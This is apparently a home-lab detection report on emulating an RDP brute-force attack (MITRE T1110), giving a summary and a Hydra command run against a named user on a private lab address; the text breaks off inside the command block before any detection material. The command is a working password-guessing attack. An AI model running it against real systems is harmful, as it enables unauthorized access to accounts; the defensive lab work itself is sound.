# 🕵️ Detection Report: RDP Brute Force Attack
**MITRE Technique:** [T1110 (Brute Force)](https://attack.mitre.org/techniques/T1110/)

## 1. Executive Summary
I emulated an external attacker attempting to gain unauthorized remote access to the network by brute-forcing Remote Desktop Protocol (RDP) credentials. The attack utilized **Hydra** to cycle through a password list against a specific target user (`vishavs`).

## 2. The Attack (Red Team)
**Tool:** Hydra (Kali Linux)
**Target User:** `vishavs`
**Protocol:** RDP (Port 3389)

**Command Executed:**
```bash
hydra -l vishavs -P pass.txt -t 4 -V rdp://192.168.10.100
